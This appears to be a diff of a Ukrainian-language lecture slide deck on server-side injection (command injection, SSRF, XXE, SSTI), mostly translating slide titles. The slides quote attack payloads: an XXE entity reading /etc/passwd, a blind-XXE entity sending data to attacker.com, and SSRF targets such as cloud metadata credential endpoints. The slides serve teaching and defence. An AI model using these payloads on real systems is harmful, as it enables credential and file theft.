@@ -28,12 +28,12 @@
       <span class="slide-icon">🖥️</span>
       <h1>Серверні ін'єкції та SSRF</h1>
       <p class="subtitle">Лекція 5.2</p>
-      <span class="tag tag-red" style="margin-top: 1rem;">Command Injection, SSRF, XXE, SSTI</span>
+      <span class="tag tag-red" style="margin-top: 1rem;">Впровадження команд, SSRF, XXE, SSTI</span>
     </section>
 
     <!-- 2. Command Injection -->
     <section class="slide">
-      <h1>Command Injection</h1>
+      <h1>Впровадження команд (Command Injection)</h1>
       <h2>Виконання команд ОС через додаток</h2>
       <div class="icon-list">
         <div class="icon-list-item">
@@ -56,27 +56,27 @@
 
     <!-- 3. SSRF -->
     <section class="slide">
-      <h1>SSRF — Server-Side Request Forgery</h1>
+      <h1>Підробка серверних запитів (SSRF)</h1>
       <h2>Сервер робить запити від імені зловмисника</h2>
       <div class="card-grid">
         <div class="card accent-red">
           <span class="card-icon">☁️</span>
-          <div class="card-title">Cloud Metadata</div>
+          <div class="card-title">Хмарні метадані (Cloud Metadata)</div>
           <div class="card-text">169.254.169.254 → IAM credentials, secret keys, повний доступ до AWS</div>
         </div>
         <div class="card accent-orange">
           <span class="card-icon">🔍</span>
-          <div class="card-title">Internal Scan</div>
+          <div class="card-title">Сканування мережі (Internal Scan)</div>
           <div class="card-text">Виявлення Redis, Elasticsearch, адмін-панелей без автентифікації</div>
         </div>
         <div class="card accent-purple">
           <span class="card-icon">📤</span>
-          <div class="card-title">Data Exfiltration</div>
+          <div class="card-title">Витік даних (Data Exfiltration)</div>
           <div class="card-text">Читання внутрішніх файлів через file:// протокол</div>
         </div>
         <div class="card accent-blue">
           <span class="card-icon">🔄</span>
-          <div class="card-title">Pivot</div>
+          <div class="card-title">Переміщення (Pivot)</div>
           <div class="card-text">Атака на внутрішні сервіси через скомпрометований сервер</div>
         </div>
       </div>
@@ -99,7 +99,7 @@
         </div>
         <div class="step">
           <div class="step-num">3</div>
-          <div class="step-title">S3 Access</div>
+          <div class="step-title">Доступ до S3</div>
           <div class="step-desc">Доступ до S3-бакетів з даними</div>
         </div>
         <div class="step">
@@ -115,12 +115,12 @@
 
     <!-- 5. XXE -->
     <section class="slide">
-      <h1>XXE — XML External Entity</h1>
+      <h1>Зовнішні сутності XML (XXE)</h1>
       <h2>Вразливість XML-парсерів</h2>
       <div class="icon-list">
         <div class="icon-list-item">
           <span class="il-icon">📄</span>
-          <span class="il-text"><strong>File read:</strong> зовнішня сутність читає /etc/passwd або конфігурації</span>
+          <span class="il-text"><strong>Читання файлів (File Read):</strong> зовнішня сутність читає /etc/passwd або конфігурації</span>
         </div>
         <div class="icon-list-item">
           <span class="il-icon">🌐</span>
@@ -128,7 +128,7 @@
         </div>
         <div class="icon-list-item">
           <span class="il-icon">💥</span>
-          <span class="il-text"><strong>Billion Laughs:</strong> DoS через рекурсивне розгортання сутностей</span>
+          <span class="il-text"><strong>«Мільярд сміхів» (Billion Laughs):</strong> DoS через рекурсивне розгортання сутностей</span>
         </div>
         <div class="icon-list-item">
           <span class="il-icon">🏦</span>
@@ -142,7 +142,7 @@
 
     <!-- 6. SSTI -->
     <section class="slide">
-      <h1>SSTI — Template Injection</h1>
+      <h1>Серверна ін'єкція в шаблони (SSTI)</h1>
       <h2>Ін'єкція в серверні шаблонізатори</h2>
       <div class="two-col">
         <div class="col">
@@ -161,7 +161,7 @@
         <div class="col">
           <div class="card accent-orange" style="height: 100%;">
             <span class="card-icon">🏦</span>
-            <div class="card-title">FinTech вектори</div>
+          <div class="card-title">Вектори у фінтех</div>
             <div class="card-text" style="margin-top: 8px; font-size: 0.95rem; line-height: 1.7;">
               Email-шаблони з ім'ям клієнта<br>
               PDF-виписки з даними<br>
@@ -183,22 +183,22 @@
       <div class="card-grid">
         <div class="card accent-green">
           <span class="card-icon">🚫</span>
-          <div class="card-title">No Shell</div>
+          <div class="card-title">Без shell-команд</div>
           <div class="card-text">Ніколи shell execution з user input. Бібліотечні API замість CLI</div>
         </div>
         <div class="card accent-blue">
           <span class="card-icon">🌐</span>
-          <div class="card-title">SSRF Protection</div>
+          <div class="card-title">Захист від SSRF</div>
           <div class="card-text">Блокування приватних IP, whitelist доменів, IMDSv2</div>
         </div>
         <div class="card accent-orange">
           <span class="card-icon">📄</span>
-          <div class="card-title">XXE Prevention</div>
+          <div class="card-title">Запобігання XXE</div>
           <div class="card-text">Вимкнути DTD та external entities у всіх XML-парсерах</div>
         </div>
         <div class="card accent-purple">
           <span class="card-icon">📝</span>
-          <div class="card-title">Template Safety</div>
+          <div class="card-title">Безпека шаблонів</div>
           <div class="card-text">Sandbox шаблонізатора, заборона виконання коду</div>
         </div>
       </div>
@@ -211,7 +211,7 @@
       <div class="card-grid">
         <div class="card accent-red">
           <span class="card-icon">☁️</span>
-          <div class="card-title">Cloud Metadata</div>
+          <div class="card-title">Хмарні метадані (Cloud Metadata)</div>
           <div class="card-text">AWS: 169.254.169.254/latest/meta-data/iam/<br>GCP: metadata.google.internal<br>Azure: 169.254.169.254/metadata</div>
         </div>
         <div class="card accent-orange">
@@ -226,7 +226,7 @@
         </div>
         <div class="card accent-blue">
           <span class="card-icon">📂</span>
-          <div class="card-title">Файлові протоколи</div>
+          <div class="card-title">Файлові протоколи (File Protocols)</div>
           <div class="card-text">file:///etc/passwd<br>gopher:// для складних запитів<br>ftp:// для внутрішніх файлів</div>
         </div>
       </div>
@@ -242,7 +242,7 @@
       <div class="icon-list">
         <div class="icon-list-item">
           <span class="il-icon">📄</span>
-          <span class="il-text"><strong>File Read:</strong> &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; → читання системних файлів</span>
+          <span class="il-text"><strong>Читання файлів (File Read):</strong> &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; → читання системних файлів</span>
         </div>
         <div class="icon-list-item">
           <span class="il-icon">🌐</span>
@@ -250,11 +250,11 @@
         </div>
         <div class="icon-list-item">
           <span class="il-icon">💥</span>
-          <span class="il-text"><strong>Billion Laughs:</strong> рекурсивне розгортання сутностей → DoS, пам'ять сервера вичерпується</span>
+          <span class="il-text"><strong>«Мільярд сміхів» (Billion Laughs):</strong> рекурсивне розгортання сутностей → DoS, пам'ять сервера вичерпується</span>
         </div>
         <div class="icon-list-item">
           <span class="il-icon">📤</span>
-          <span class="il-text"><strong>Blind XXE:</strong> дані через OOB — &lt;!ENTITY % xxe SYSTEM "http://attacker.com/?d=..."&gt;</span>
+          <span class="il-text"><strong>Сліпа XXE (Blind XXE):</strong> дані через OOB — &lt;!ENTITY % xxe SYSTEM "http://attacker.com/?d=..."&gt;</span>
         </div>
       </div>
       <div class="highlight-box warning" style="margin-top: 1.2rem;">
@@ -264,7 +264,7 @@
 
     <!-- 10. Command Injection патерни -->
     <section class="slide">
-      <h1>Command Injection: патерни</h1>
+      <h1>Впровадження команд: патерни</h1>
       <h2>Як зловмисники впроваджують команди ОС</h2>
       <div class="card-grid">
         <div class="card accent-red">
